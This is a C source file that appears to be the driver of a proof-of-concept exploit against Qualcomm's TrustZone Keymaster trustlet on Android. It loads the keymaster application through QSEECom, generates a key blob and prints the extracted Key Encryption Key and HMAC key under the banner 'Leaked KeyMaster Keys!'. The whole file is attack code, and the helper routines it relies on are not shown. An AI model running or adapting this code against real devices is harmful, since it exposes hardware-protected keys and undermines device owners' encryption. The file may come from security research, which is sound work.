#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <errno.h>

#include "QSEEComAPI.h"
#include "keymaster_commands.h"
#include "keymaster_common.h"
#include "keymaster_qcom.h"

#define KEYMASTER_PATH ("/firmware/image/")
#define KEYMASTER_APP_NAME ("keymaste")
#define KEYMASTER_BUFFER_SIZE (0x10000)

#define KEK_LENGTH (0x10)
#define HMAC_KEY_LENGTH (0x20)

int main(int argc, char** argv) {
    //Loading the keymaster application
	struct qcom_keymaster_handle* km_handle = initialize_keymaster_handle();
    if (km_handle==NULL) {
		perror("[-] Failed to load libQseeCom.Api");
		return -errno;
    } 
    int res = (*km_handle->QSEECom_start_app)((struct QSEECom_handle **)&km_handle->qseecom,
  										  KEYMASTER_PATH, KEYMASTER_APP_NAME, KEYMASTER_BUFFER_SIZE);
	if (res < 0) {
		perror("[-] Failed to load Keymaster");
		return -errno;
	}
	printf("[+] Keymaster load res: %d\n", res);

    //Generating another key! This one should have some interesting data...
	uint8_t* key_blob = NULL;
	size_t key_blob_length = 0;
    generate_keymaster_key(km_handle, &key_blob, &key_blob_length);
	
	//Extracting the keys from the key-blob
	printf("-----------------------------------------------\n");
	printf("[+] Leaked KeyMaster Keys!\n");

	printf("[+] KeyMaster Key Encryption Key (KEK): ");
	for (uint32_t i=0; i<KEK_LENGTH; i++)
		printf("%02X", key_blob[i]);
	printf("\n");

	printf("[+] KeyMaster HMAC Key: ");
	for (uint32_t i=0; i<HMAC_KEY_LENGTH; i++)
		printf("%02X", key_blob[KEK_LENGTH + i]);
	printf("\n");


    return 0;
}

